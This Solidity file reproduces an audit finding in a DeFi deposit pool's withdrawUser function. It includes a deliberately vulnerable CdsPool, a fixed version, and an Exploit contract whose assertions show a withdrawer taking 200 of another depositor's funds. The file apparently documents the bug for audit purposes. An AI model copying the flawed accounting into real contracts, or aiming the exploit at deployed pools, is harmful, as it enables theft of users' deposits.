// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Autonomint CDSLib.withdrawUser — H-7 (Sherlock, 2024-11), finding 45460.
    liquidationAmount is the liquidation capacity still left on the position,
    not the amount already consumed. withdrawUser deducts
    depositedAmount - liquidationAmount (900) instead of the deposit that is
    actually left (700). The withdrawing owner is paid 200 of the other
    depositor's funds, and totalCdsDepositedAmount falls 200 too far. */

contract Token {
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory s) {
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract CdsPool {
    Token public asset;
    uint256 public totalCdsDepositedAmount;
    mapping(address => uint256) public depositedAmount;
    mapping(address => uint256) public liquidationAmount;
    mapping(address => uint256) public initialLiquidationAmount;

    constructor(Token _asset) {
        asset = _asset;
    }

    function open(address user, uint256 deposit, uint256 initialLiq, uint256 leftLiq) external {
        depositedAmount[user] = deposit;
        initialLiquidationAmount[user] = initialLiq;
        liquidationAmount[user] = leftLiq;
        totalCdsDepositedAmount += deposit - (initialLiq - leftLiq);
    }

    function withdrawUser(address user) external {
        uint256 deposit = depositedAmount[user];
        uint256 leftLiquidation = liquidationAmount[user];
        // @> VULN: liquidationAmount is the remainder, so this deducts more than the deposit left
        totalCdsDepositedAmount -= (deposit - leftLiquidation);
        require(asset.transfer(user, deposit - leftLiquidation), "pay");
        depositedAmount[user] = 0;
    }

    function leftDeposit(address user) public view returns (uint256) {
        return depositedAmount[user] - (initialLiquidationAmount[user] - liquidationAmount[user]);
    }
}

contract CdsPoolFixed {
    Token public asset;
    uint256 public totalCdsDepositedAmount;
    mapping(address => uint256) public depositedAmount;
    mapping(address => uint256) public liquidationAmount;
    mapping(address => uint256) public initialLiquidationAmount;

    constructor(Token _asset) {
        asset = _asset;
    }

    function open(address user, uint256 deposit, uint256 initialLiq, uint256 leftLiq) external {
        depositedAmount[user] = deposit;
        initialLiquidationAmount[user] = initialLiq;
        liquidationAmount[user] = leftLiq;
        totalCdsDepositedAmount += deposit - (initialLiq - leftLiq);
    }

    function withdrawUser(address user) external {
        uint256 deposit = depositedAmount[user];
        uint256 used = initialLiquidationAmount[user] - liquidationAmount[user];
        uint256 left = deposit - used;
        totalCdsDepositedAmount -= left;
        require(asset.transfer(user, left), "pay");
        depositedAmount[user] = 0;
    }
}

contract Exploit {
    Token public asset;
    CdsPool public pool;
    address public victim;
    uint256 public paid;
    uint256 public totalAfter;
    uint256 public victimShort;

    constructor() {
        asset = new Token("CDS");
        pool = new CdsPool(asset);
        victim = address(0xBEEF);
        pool.open(address(this), 1000 ether, 400 ether, 100 ether);
        pool.open(victim, 1000 ether, 0, 0);
        asset.mint(address(pool), 1700 ether);
    }

    function run() external {
        uint256 beforeTotal = pool.totalCdsDepositedAmount();
        pool.withdrawUser(address(this));
        paid = asset.balanceOf(address(this));
        totalAfter = pool.totalCdsDepositedAmount();
        victimShort = 1000 ether - asset.balanceOf(address(pool));
        require(beforeTotal == 1700 ether, "700 left plus the other 1000");
        require(paid == 900 ether, "withdraw pays 900");
        require(paid - 700 ether == 200 ether, "200 belongs to the other depositor");
        require(totalAfter == 800 ether, "global total falls by 900 to 800");
        require(victimShort == 200 ether, "other depositor is short 200");
        require(pool.depositedAmount(victim) == 1000 ether, "other deposit record remains 1000");
    }
}
